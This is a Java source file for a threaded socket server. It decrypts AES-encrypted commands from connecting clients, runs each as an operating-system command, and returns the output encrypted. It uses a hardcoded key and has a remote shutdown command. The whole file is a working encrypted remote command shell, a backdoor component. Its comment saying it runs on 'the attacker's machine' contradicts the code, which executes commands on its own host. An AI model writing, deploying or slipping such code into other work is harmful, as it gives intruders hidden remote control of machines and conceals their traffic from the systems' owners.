import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.Key;
import java.util.Base64;

//  Needs to be running on the attacker's machine.

public class Server {

	public static void main(String[] args) throws Exception {

		//Port number of the server
		final int port = args.length == 1 ? Integer.valueOf(args[0]) : 5000;


		String endSignal = "%**%";

		String encryptionKey = "sixteen byte key";

		//Encryption algorithm
		String algorithm = "AES";

		CryptoHelper cryptoHelper = new CryptoHelper(encryptionKey, algorithm);

		final ServerSocket serverSocket = new ServerSocket(port);

		while (!serverSocket.isClosed()) {

			//Accepting request
			Socket socket = serverSocket.accept();

			Thread thread = new Thread(() -> {
				try {

					//Used to read data from socket's input stream
					BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
					//Used to write data to socket's output stream
					PrintWriter printWriter = new PrintWriter(socket.getOutputStream());


					while (!socket.isClosed()) {


						String cmd = cryptoHelper.decrypt(bufferedReader.readLine());

						if (cmd.equals("exit"))
							break;
						if (cmd.equals("exit-server")) {
							System.exit(0);
						}

						//Running the command
						try {

							Process p = Runtime.getRuntime().exec(cmd);


							BufferedReader buf = new BufferedReader(new InputStreamReader(p.getInputStream()));

							buf.lines().forEach(s -> {
								try {

									printWriter.println(cryptoHelper.encrypt(s));
								} catch (Exception e) {
									e.printStackTrace();
								}

								printWriter.flush();
							});
						} catch (Exception e) {
							e.printStackTrace();

							printWriter.println(cryptoHelper.encrypt(e.getMessage()));
							printWriter.flush();
						}

						printWriter.println(cryptoHelper.encrypt(endSignal));
						printWriter.flush();
					}

				} catch (Exception e) {
					e.printStackTrace();
				}
			}, "client");
			thread.start();
		}
	}


	static class CryptoHelper {

		private final Cipher cipher;
		private final Key key;

		CryptoHelper(String key, String algo) throws Exception {
			this.key = new SecretKeySpec(key.getBytes(), algo);
			this.cipher = Cipher.getInstance(algo);
		}

		String encrypt(String plaintext) throws Exception {
			if (plaintext == null)
				return null;
			cipher.init(Cipher.ENCRYPT_MODE, key);
			byte[] encrypted = cipher.doFinal(plaintext.getBytes());
			return Base64.getEncoder().encodeToString(encrypted);
		}

		String decrypt(String encrypted) throws Exception {
			if (encrypted == null)
				return null;
			cipher.init(Cipher.DECRYPT_MODE, key);
			byte[] decordedValue = Base64.getDecoder().decode(encrypted);
			byte[] decrypted = cipher.doFinal(decordedValue);
			return new String(decrypted);
		}
	}

}